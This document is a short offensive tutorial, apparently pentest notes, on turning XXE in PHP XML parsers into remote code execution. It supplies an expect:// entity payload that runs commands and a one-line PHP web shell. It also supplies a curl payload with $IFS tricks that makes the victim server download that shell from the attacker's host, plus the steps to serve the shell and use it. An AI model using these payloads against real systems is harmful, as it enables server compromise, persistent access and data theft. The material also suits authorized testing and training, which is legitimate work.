# Remote Code Execution (RCE) via XXE

Goal: Go beyond file disclosure and achieve command execution through vulnerable XML parsers, typically on PHP-based apps.
# 1. Using `expect://` Wrapper (PHP-only)

PHP supports a special wrapper called `expect://` that executes commands. Only works if the `expect` extension is enabled (not by default).

Example:

```xml
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "expect://id">
]>
<email>&xxe;</email>
```

If the output of `id` is reflected in response, RCE is confirmed.

Works only if:

- `expect` module is installed
- Output is reflected in an XML element
# 2. Dropping a Web Shell with `curl`

If command output isnâ€™t shown (blind), you can drop a reverse shell by having the server download your web shell from your machine.

### Step 1: Create `shell.php`

```php
<?php system($_REQUEST["cmd"]); ?>
```

Host it:

```bash
python3 -m http.server 80
```

### Step 2: XXE Payload using `expect://curl`

```xml
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "expect://curl$IFS-O$IFS'http://YOUR_IP/shell.php'">
]>
<email>&xxe;</email>
```

- `$IFS` is used to avoid XML-breaking spaces    
- If successful, `shell.php` is dropped into current working directory

### Step 3: Access shell

```bash
http://victim-ip/shell.php?cmd=id
```

If you can access the uploaded file in a browser, you now have a full RCE shell via web.

# 3. When to Use This

- Prefer file disclosure first
- Use RCE only when necessary (e.g. you need persistence or reverse shell)
- Works only on PHP targets where either:
    - `expect://` is enabled
    - PHP can write to web directory

Avoid special characters like `>`, `|`, `{` unless encoded or obfuscated